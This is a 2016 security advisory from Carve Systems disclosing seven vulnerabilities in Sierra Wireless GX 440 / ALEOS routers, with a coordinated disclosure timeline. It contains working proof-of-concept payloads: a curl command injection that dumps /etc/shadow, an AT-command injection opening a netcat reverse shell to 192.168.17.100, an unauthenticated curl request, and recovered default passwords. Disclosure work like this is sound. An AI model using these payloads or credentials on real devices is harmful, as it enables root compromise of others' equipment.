# June 2016 Sierra Wireless Advisory

Sierra Wireless customers can find more details about the products affected by these issues and workarounds on the Sierra Wireless site. Customers will need to authenticate before downloading content.

Carve Systems consultants performed, and continue to perform, research on a number of IoT devices. The Carve Systems team coordiantes its disclosure with vendors when at all possible. This advisory is for the Sierra GX 440. In 2015 the consultants performed research against the GX 440 running the 4.3.2a.010 version of the firmware. The consultants discovered numerous security findings and disclosed these findings to the vendor.

This advisory covers seven CVEs (details pending):

- [CVE-2016-5065](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5065)
- [CVE-2016-5066](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5066)
- [CVE-2016-5067](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5067)
- [CVE-2016-5068](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5068)
- [CVE-2016-5069](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5069)
- [CVE-2016-5070](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5070)
- [CVE-2016-5071](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5071)

Disclosure Timeline

- 3/11/16 – Initial contact email sent to vendor.
- 4/5/16 – Disclosure to CERT/CC (VU#829752).
- 4/7/16 – CERT/CC communicates findings to Sierra. Projected disclosure date is 5/13/16.
- 4/15/16 – CERT/CC indicates that Sierra would like to work directly with Carve. Introduction email.
- 4/15/16 to 5/3/16 – Carve communicates additional details to Sierra. Sierra and Carve work together to understand which vulnerabilities have already been patched in newer release.
- 5/11/16 – Carve/Sierra mutually agree to delay publication until 5/31/16.
- 6/9/16 – Coordinated public disclosure.

Original Advisory Content

Below is the original advisory provided to Sierra Wireless.

Affected System Configuration

Sierra GX 440 in its default configuration. Affected versions: ALEOS firmware 4.3.2 - Current (as of June 2016).

Vulnerability Description

This disclosure covers distinct vulnerabilities, enumerated below:

1.  Command injection in management web application
2.  Weak passwords are easily recovered
3.  Command injection via AT interface
4.  Lack of authentication in the management web application
5.  Weak session tokens in management web application
6.  Plaintext application password storage
7.  Management web application runs as root.

1. COMMAND INJECTION IN MANAGEMENT WEB APPLICATION

The management web application has a command injection vulnerability at
the following URL:

    curl -i -s -k  -X 'POST' -H 'Content-Type: text/xml; charset=UTF-8' \
    --data-binary $'5025=Data To Store' \
    'http://management_server_lan_ip:9191/Embedded_Ace_Set_Task.cgi'

The 5025 parameter is command injectable. Entering
5025=data;cat${IFS}/etc/shadow${IFS}>>/mnt/hda1/junxion/log/messages for
the data parameter causes the system to put the contents of the shadow
file into the log file, viewable in the management web application.

2. WEAK PASSWORDS ARE EASILY RECOVERED

The firmware is shipped with weak default passwords. A password cracker
was able to trivially recover the following passwords:

  admin:2222:10957:0:99999:7:::
  rauser:12345:15409:0:99999:7:::
  user:12345:13666:0:::::
  sconsole:12345:13666:0:::::

The passwords were usable to gain root access to the system directly via
telnet.

3. COMMAND INJECTION VIA AT INTERFACE

The device provided an authenticated (via simple password) "Hayes AT"
style command interface suffers from command injection. The AT
interface, accessible via a plain text TCP client, such as netcat,
socat, or telnet, can set parameters.

At least one parameter was identified to be vulnerable to command
injection.

   AT*HOSTUID=yes;sleep${IFS}120;nc${IFS}192.168.17.100:9001${IFS}-e${IFS}/bin/sh

The above injection parameter launches a remote shell to the specified
IP address, 192.168.17.100, in this case, upon system reboot. This
enabled the researchers to gain root access to the device. This is
complicated by the prevalence of devices using ALEOS that have default
passwords, making it more likely an attacker can exploit this
vulnerability.

4. LACK OF AUTHENTICATION IN THE MANAGEMENT WEB APPLICATION

The researchers observed that raw HTTP requests to the HTTP end points
responsible for setting and saving data in the management web
application did not require authentication. An attacker can get or set
any data parameter in the application, including the management web
application password.

   curl -i -s -k  -X 'POST' -H 'Content-Type: text/xml; charset=UTF-8' --data-binary $'5003'
   'http://192.168.13.31:9191/Embedded_Ace_Get_Task.cgi'

The attacker can then use COMMAND INJECTION IN MANAGEMENT WEB
APPLICATION to gain privileged root/shell access to the device.

5. WEAK SESSION TOKENS IN MANAGEMENT WEB APPLICATION

The application derived the session token by using a very weak
permutation of the current time and the users password. The session
token was trivially reversible.

Additionally, the session token was stored in the URL. It used a simple
integer array and basic arithmetic to "obfuscate" the password using
JavaScript. This "session token" is all that was required to access the
management web application.

6. PLAINTEXT APPLICATION PASSWORD STORAGE

The device stored the management web application password in plain text
on flash storage.

7. MANAGEMENT WEB APPLICATION RUNS AS ROOT

The management web application runs as root. Best practice dictates
daemons execute following the principle of least privilege. In this case
the command injection from issue 1. COMMAND INJECTION IN MANAGEMENT WEB
APPLICATION allows for much easier compromise of the device as a whole.
Sierra devices, by default, do not expose the administrative web
application. However, if these administrative web applications are ever
exposed this issue makes it much easier for an attacker to completely
compromise the device in conjunction with other vulnerabilities.


How was this vulnerability found

These vulnerabilities were discovered using standard reverse engineering
and penetration tools:

-   HTTP MiTM Proxies
-   Hex editors
-   ARM Disassemblers
-   Text editors
-   Texas Instruments TI-89 Graphing Calculator

Vulnerability impact

Although these vulnerabilities were discovered on a specific device, the
Sierra GX 440, the vulnerabilities are generally applicable to the ALEOS
platform, which is in very wide deployment on numerous Sierra devices.

1.  A malicious attacker can use these vulnerabilities to freely gain
root access to devices they control.
2.  An attacker can use some of these vulnerabilities to compromise and
gain root access devices with weak or default configuration.
3.  An attacker can easily compromise devices it has local, but
non-physical access using these vulnerabilities.

